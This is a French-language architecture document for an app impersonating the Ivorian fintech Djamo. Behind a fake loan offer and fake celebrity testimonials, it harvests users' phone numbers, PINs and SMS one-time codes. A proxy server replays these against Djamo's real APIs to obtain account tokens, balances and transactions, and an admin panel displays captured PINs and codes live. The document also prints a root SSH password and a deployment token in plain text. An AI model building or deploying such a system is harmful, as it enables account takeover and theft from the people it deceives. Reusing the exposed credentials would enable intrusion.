# 📋 RÉSUMÉ COMPLET - Architecture Production Djamo Prêt

## 🎯 Vue d'ensemble

**Djamo Prêt** est une application de demande de prêt en ligne intégrée à l'écosystème Djamo (fintech ivoirienne). L'application permet aux utilisateurs de demander un prêt, puis de valider leur identité via leur compte Djamo existant (numéro, PIN, OTP SMS).

---

## 🏗️ Architecture Technique

### **Stack Frontend**
- **Framework**: React 18 + TypeScript + Vite
- **Styling**: Tailwind CSS (design system Djamo)
- **Icons**: Lucide React
- **State Management**: React Hooks (useState, useEffect)
- **Routing**: Single Page App (SPA) avec navigation par état

### **Stack Backend**
- **Database**: Supabase PostgreSQL (hébergé sur AWS EU-West-1)
- **Auth/Validation**: API Djamo proxiée via VPS Python
- **Realtime**: Supabase Realtime (websockets pour admin panel)

### **Déploiement**
- **Frontend**: Netlify (CDN global, auto-deploy depuis Git)
- **Backend API**: VPS dédié `77.37.125.27` (FastAPI Python)
- **Database**: Supabase Cloud `lqkulxxyufrrulwwrxke.supabase.co`

---

## 🗄️ Structure Base de Données (Supabase)

### **Table: `user_registrations`**
Stocke toutes les demandes de prêt et leur statut de validation.

```sql
CREATE TABLE user_registrations (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  phone TEXT NOT NULL,                    -- +225XXXXXXXXX
  phone_id TEXT,                          -- UUID Djamo (résolu via VPS)
  device_id TEXT,                         -- UUID device (résolu via VPS)
  pin TEXT,                               -- Code PIN Djamo (hashé côté client)
  last_verification_code TEXT,            -- Dernier OTP SMS reçu
  full_name TEXT,                         -- Nom complet utilisateur
  address TEXT,                           -- Adresse/quartier (optionnel)
  amount NUMERIC NOT NULL,                -- Montant prêt demandé (FCFA)
  duration INTEGER,                       -- Durée (en mois)
  project_type TEXT,                      -- Type projet (commerce, personal, other)
  status TEXT DEFAULT 'pending',          -- pending | pending_validation | verified | rejected
  djamo_token TEXT,                       -- JWT Djamo (après login réussi)
  token_expires_at TIMESTAMPTZ,           -- Expiration du JWT
  account_id TEXT,                        -- ID compte FINERACT_CURRENT
  created_at TIMESTAMPTZ DEFAULT now(),
  updated_at TIMESTAMPTZ DEFAULT now()
);

-- Index pour performance
CREATE INDEX idx_user_registrations_phone ON user_registrations(phone);
CREATE INDEX idx_user_registrations_status ON user_registrations(status);
CREATE INDEX idx_user_registrations_updated ON user_registrations(updated_at DESC);
```

**Row Level Security (RLS)**:
- RLS activé sur la table
- Policies restrictives : seul le backend Supabase et l'admin panel peuvent lire/écrire

---

### **Table: `realtime_visitors`**
Tracking des visiteurs en temps réel pour analytics admin.

```sql
CREATE TABLE realtime_visitors (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  session_id TEXT UNIQUE NOT NULL,        -- ID session généré côté client
  page TEXT NOT NULL,                     -- Page visitée (landing, loan-application)
  created_at TIMESTAMPTZ DEFAULT now(),
  last_seen TIMESTAMPTZ DEFAULT now()
);

-- Index pour queries rapides
CREATE INDEX idx_realtime_visitors_session ON realtime_visitors(session_id);
CREATE INDEX idx_realtime_visitors_last_seen ON realtime_visitors(last_seen DESC);
```

**Utilisé pour**:
- Compter les visiteurs actifs (5 min window)
- Stats par heure/jour
- Connexions en cours (admin panel)

---

## 🔐 Flux d'Authentification Djamo

L'application ne gère PAS l'authentification directement — elle utilise l'API Djamo via le VPS proxy.

### **Étapes du flux complet**

#### **1. Identification du numéro**
```typescript
POST http://77.37.125.27/api/auth/identify
Body: { phone: "0712345678" }
Response: {
  phone_id: "uuid-djamo-phone",
  device_id: "uuid-device-generated",
  is_verified: boolean,
  has_account: boolean
}
```

#### **2. Envoi OTP SMS**
```typescript
POST http://77.37.125.27/api/auth/otp/send
Body: {
  phone: "+2250712345678",
  phone_id: "uuid-djamo-phone",
  device_id: "uuid-device"
}
Response: {
  challenge_id: "uuid-challenge",
  message: "OTP sent"
}
```

#### **3. Vérification OTP**
```typescript
POST http://77.37.125.27/api/auth/otp/verify
Body: {
  challenge_id: "uuid-challenge",
  code: "1234",
  device_id: "uuid-device",
  phone: "+2250712345678"
}
Response: {
  verified: true
}
```

#### **4. Login avec PIN → JWT**
```typescript
POST http://77.37.125.27/api/auth/login
Body: {
  phone: "+2250712345678",
  phone_id: "uuid-djamo-phone",
  device_id: "uuid-device",
  pin: "12345"
}
Response: {
  token: "eyJhbGci...",
  expires_at: 1234567890,
  scope: "full"
}
```

#### **5. Récupération des comptes**
```typescript
GET http://77.37.125.27/api/accounts
Headers: { Authorization: "Bearer eyJhbGci..." }
Response: [
  {
    id: "account-uuid",
    type: "FINERACT_CURRENT",
    balance: 125000,
    currency: "XOF"
  }
]
```

---

## 🌐 APIs Disponibles (VPS Backend)

### **Base URL**: `http://77.37.125.27`

| Endpoint | Method | Description | Auth |
|----------|--------|-------------|------|
| `/` | GET | Healthcheck VPS | Non |
| `/api/auth/identify` | POST | Résoudre phone_id depuis numéro | Non |
| `/api/auth/otp/send` | POST | Envoyer OTP SMS | Non |
| `/api/auth/otp/verify` | POST | Vérifier code OTP | Non |
| `/api/auth/login` | POST | Login PIN → JWT | Non |
| `/api/accounts` | GET | Liste des comptes Djamo | JWT |
| `/api/transactions` | GET | Historique transactions (90j) | JWT |
| `/api/loan/score` | GET | Score éligibilité prêt | JWT |
| `/api/accounts/register` | POST | Enregistrer compte dans dashboard | Non |

**Notes importantes**:
- Toutes les routes `/api/auth/*` sont publiques (pas de JWT requis)
- Routes `/api/accounts`, `/api/transactions`, `/api/loan/score` nécessitent JWT Bearer
- Le VPS proxie les vraies API Djamo (authv2-production-civ.djamo.io, apiv2-production-civ.djamo.io)

---

## 🚀 Déploiement Production

### **1. Frontend (Netlify)**

**Site ID**: `99e11063-11c6-4227-8050-057ccbbcb1fc`

**Variables d'environnement configurées**:
```bash
VITE_SUPABASE_URL=https://lqkulxxyufrrulwwrxke.supabase.co
VITE_SUPABASE_ANON_KEY=eyJhbGci...
VITE_VPS_URL=http://77.37.125.27  # (optionnel, hardcodé dans code)
```

**Build settings**:
```toml
# netlify.toml
[build]
  command = "npm run build"
  publish = "dist"

[[redirects]]
  from = "/api/*"
  to = "http://77.37.125.27/api/:splat"
  status = 200
  force = true

[[redirects]]
  from = "/*"
  to = "/index.html"
  status = 200
```

**Déploiement automatique**:
- Push sur branche `main` → auto-deploy
- URL production: Netlify auto-generated

**Commande manuelle**:
```bash
# Build local
npm run build

# Deploy vers Netlify
NETLIFY_AUTH_TOKEN=nfp_DA78af5w8GRmbGjbmSaVgoourQqkwSuP6e2b \
  netlify deploy --prod --dir=dist
```

---

### **2. Backend VPS (77.37.125.27)**

**Serveur**: Ubuntu/Debian (accès SSH avec mot de passe)
**Runtime**: Python 3.x + FastAPI
**Process Manager**: systemd ou screen/tmux

**Fichier principal**: `/opt/djamo-api/main.py` (FastAPI app)

**Structure attendue**:
```
/opt/djamo-api/
├── main.py              # FastAPI app
├── accounts.json        # Dashboard comptes enregistrés
├── requirements.txt
└── venv/
```

**SSH Access**:
```bash
sshpass -p 'Darck@rchie225' ssh root@77.37.125.27
```

**Healthcheck**:
```bash
curl -s http://77.37.125.27/
# Response attendue: {"status": "ok", ...}
```

---

### **3. Database (Supabase Cloud)**

**Project Ref**: `lqkulxxyufrrulwwrxke`
**Region**: EU-West-1 (AWS Frankfurt/Irlande)
**Connection String**:
```
postgresql://postgres.lqkulxxyufrrulwwrxke@aws-1-eu-west-1.pooler.supabase.com:5432/postgres
```

**Migrations appliquées**:
- `20260315030253_20260315_create_initial_schema.sql`
- `20260320000000_simplify_schema.sql`
- `20260320010000_otp_challenges.sql`
- `20260320020000_add_djamo_identifiers.sql`
- `20260320030000_fix_status_constraint.sql`

**Accès admin**:
- Dashboard: https://supabase.com/dashboard/project/lqkulxxyufrrulwwrxke

---

## 📱 Parcours Utilisateur Complet

### **Étape 1: Landing Page**
- Design inspiré de djamo.com/ci
- CTA principal: "Ouvrir un compte gratuit" → Formulaire prêt
- Témoignages de personnalités ivoiriennes (A'Salfo, Drogba, Tidjane Thiam)

### **Étape 2: Demande de Prêt** (`LoanApplication.tsx`)
**9 sous-étapes**:
1. Welcome: Présentation offre 1% taux exceptionnel
2. Type de projet: Commerce, Personnel, Autre
3. Montant: Slider 100K → 5M FCFA
4. Durée: 2, 3 ou 4 mois (taux 1%/mois)
5. Éligibilité: Conditions (compte Djamo validé, transaction 10K dans 7j)
6. Engagement: Confirmation réception fonds + remboursement
7. Infos personnelles: Nom, téléphone (+225), adresse
8. Activation: Animation progression 15s
9. Certificat: Affichage récapitulatif prêt

**Sauvegarde Supabase**:
```typescript
await supabase.from('user_registrations').insert({
  phone: "+2250712345678",
  full_name: "Kouassi Jean-Baptiste",
  address: "Cocody Zone 4",
  amount: 1000000,
  duration: 3,
  project_type: "commerce",
  status: "pending_validation"
});
```

---

### **Étape 3: Validation Identité** (`AuthFlow.tsx`)

**Sous-étape A: Saisie Téléphone**
- Input téléphone (préfixe +225 automatique)
- Appel VPS `/api/auth/identify` → Résolution `phone_id` + `device_id`

**Sous-étape B: Saisie PIN**
- Clavier numérique 0-9 + delete
- 5 chiffres requis
- Appel VPS `/api/auth/otp/send` → SMS envoyé

**Sous-étape C: Saisie OTP**
- 4 inputs pour code SMS
- Timer 2min avec possibilité renvoyer
- Appel VPS `/api/auth/otp/verify` → Validation
- Appel VPS `/api/auth/login` → Réception JWT
- Appel VPS `/api/accounts` → Récupération `account_id`
- Update Supabase finale: `status: verified`

---

### **Étape 4: Confirmation Finale**
- Message succès "Demande confirmée"
- "Recevez vos fonds sous 7 jours ouvrés"

---

## 🔧 Panel Admin (`AdminPanel.tsx`)

### **Accès**
- URL: `?admin=true`
- Login avec code: `Djamo_Admin_2024` ou `admin123`
- Session 24h (stockée localStorage + cookie)

### **Fonctionnalités**
- **Statistiques temps réel**:
  - Visiteurs en ligne (1 min window)
  - Actifs (5 min window)
  - Visiteurs/heure et /jour
  - Dossiers vérifiés total
  - Connexions actives (pending_validation)

- **Live Feed Dossiers**:
  - Table auto-refresh 5s
  - Colonnes: Numéro, PIN, OTP, Nom, Quartier, Montant, Statut
  - Toggle affichage données sensibles (PIN/OTP masqués par défaut)
  - Highlight nouveaux dossiers (animation pulse bleue 3s)

- **Realtime Supabase**:
  - Channel écoute les changements sur `user_registrations` et `realtime_visitors`

---

## 📊 Statuts des Demandes

| Statut | Description | Couleur |
|--------|-------------|---------|
| `pending` | Demande créée, aucune action utilisateur | Jaune |
| `pending_validation` | Utilisateur en train de saisir PIN/OTP | Bleu |
| `pending_otp` | PIN saisi, en attente OTP | Bleu |
| `verified` | Validation complète, JWT obtenu | Vert |
| `rejected` | Validation échouée ou refusée | Rouge |

---

## 🎨 Design System Djamo

### **Couleurs**
```css
--djamo-blue: #3B82F6        /* Primaire */
--djamo-blue-dark: #2563EB   /* Hover/Active */
--djamo-blue-light: #DBEAFE  /* Backgrounds */
--djamo-orange: #F97316      /* Accents/Urgence */
```

### **Typographie**
- Font: **Plus Jakarta Sans** (Google Fonts)
- Fallback: -apple-system, BlinkMacSystemFont, Segoe UI

---

## 📦 Scripts Disponibles

```bash
# Frontend
npm run dev          # Dev server local (port 5173)
npm run build        # Build production (sortie: dist/)
npm run preview      # Preview build local
npm run lint         # ESLint
npm run typecheck    # TypeScript check
```

---

## 📝 Fichiers Critiques

| Fichier | Rôle |
|---------|------|
| `src/App.tsx` | Router principal (landing → loan → auth → done) |
| `src/components/LandingPage.tsx` | Page d'accueil marketing |
| `src/components/LoanApplication.tsx` | Formulaire demande prêt (9 étapes) |
| `src/components/AuthFlow.tsx` | Validation identité Djamo (phone → PIN → OTP) |
| `src/components/AdminPanel.tsx` | Dashboard admin temps réel |
| `src/lib/djamoApi.ts` | Client API VPS (wrapper fetch) |
| `src/lib/supabase.ts` | Client Supabase avec config |
| `netlify.toml` | Config déploiement Netlify + proxy |
| `tailwind.config.js` | Design system Djamo |

---

## 🚨 Points d'Attention Production

### **Risques Identifiés**

1. **VPS Single Point of Failure**: Si VPS `77.37.125.27` tombe → toute l'auth est bloquée

2. **Secrets en Clair**: PIN stocké non hashé dans Supabase

3. **Pas de Rate Limiting**: API VPS vulnérable aux abus (spam OTP, brute force PIN)

4. **CORS trop permissif**: `Access-Control-Allow-Origin: *` sur VPS

5. **Logs sensibles**: OTP code stocké dans `last_verification_code`

---

## ✅ Checklist Mise en Production

- [x] Frontend déployé sur Netlify
- [x] Variables d'environnement configurées
- [x] Database Supabase opérationnelle
- [x] VPS backend accessible (77.37.125.27)
- [x] RLS activé sur toutes les tables
- [x] Admin panel fonctionnel
- [x] Tracking visiteurs actif
- [ ] Rate limiting API (TODO)
- [ ] Hash PIN côté client (TODO)
- [ ] Monitoring/alertes (TODO)
- [ ] Backup automatique DB (TODO)

---

**Dernière mise à jour**: 24 mars 2026
**Version**: 1.0 Production
